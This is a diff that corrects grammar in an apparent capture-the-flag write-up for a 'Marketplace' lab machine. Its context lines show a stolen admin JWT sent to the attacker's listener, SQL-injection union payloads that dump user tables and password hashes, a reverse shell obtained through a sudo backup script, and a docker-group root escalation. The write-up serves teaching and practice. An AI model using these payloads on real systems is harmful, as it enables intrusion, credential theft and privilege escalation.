@@ -67,7 +67,7 @@ Origin: http://10.10.160.210:32768
 Connection: keep-alive
 ```
 
-Sure enough we got our cookie so lets report the listing and see if we receive an another cookie from an admin
+Sure enough we got our cookie so lets report the listing and see if we receive another cookie from an admin
 ```
 GET /token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MjA4ODgzOTR9.K8vij_h027zriEATHvIe6jYSvi04CI6uCxm84C_mRo0 HTTP/1.1
 Host: 10.13.1.12:8000
@@ -116,7 +116,7 @@ So we have sqli so lets figure out how many columns we have.
 10.10.160.210:32768/admin?user=2 order by 5
 ```
 
-After test 2-4 we find that we receive an error on 5, so we have 4 columns. Looking at the user listing we know there is no user 0 so we can see which columns are reflected with the following
+After testing 2-4 we find that we receive an error on 5, so we have 4 columns. Looking at the user listing we know there is no user 0 so we can see which columns are reflected with the following
 ```
 http://10.10.160.210:32768/admin?user=0 union select 1,2,3,4
 
@@ -146,7 +146,7 @@ ID: 1
 Is administrator: true 
 ```
 
-Lets get some user information first so lets get the columns for the users table
+Lets get some user information first, so lets get the columns for the users table
 ```
 http://10.10.160.210:32768/admin?user=0 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='users'-- -
 
@@ -168,7 +168,7 @@ User
 4:test:$2b$10$zCeYI0Tqe/NO8RRbGmbnd.Hu.EpNknzhKzFX/NL5IfuZXKqsstbzC:0 
 ```
 
-So we have so hashes that we can potentially crack and test for reuse on ssh but lets get the information in the messages table first so start by getting the columns
+So we have some hashes that we can potentially crack and test for reuse on ssh, but lets get the information in the messages table first, so start again by getting the columns
 ```
 http://10.10.160.210:32768/admin?user=0 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='messages'-- -
 
@@ -220,13 +220,13 @@ We start our listener then execute the script as michael
 sudo -u michael /opt/backups/backup.sh
 ```
 
-We get our reverse shell and stablize it. We then check for sudo, cronjobs, and suid but to no avail however checking our id shows the following
+We get our reverse shell and stablize it. We then check for sudo, cronjobs, and suid but to no avail. However checking our id shows the following
 ```
 michael@the-marketplace:/home/michael$ id
 uid=1002(michael) gid=1002(michael) groups=1002(michael),999(docker)
 ```
 
-Looks like we are in the docker group so lets leverage this to use an image to make a new container with the root filesystem mounted and start a shell. First we check we have images available, otherwise we have to upload one
+Looks like we are in the docker group so lets leverage this to use an image to make a new container with the root filesystem mounted and start a shell. First we check if we have images available, otherwise we have to upload one
 ```
 michael@the-marketplace:/home/michael$ docker image ls
 REPOSITORY                   TAG                 IMAGE ID            CREATED             SIZE
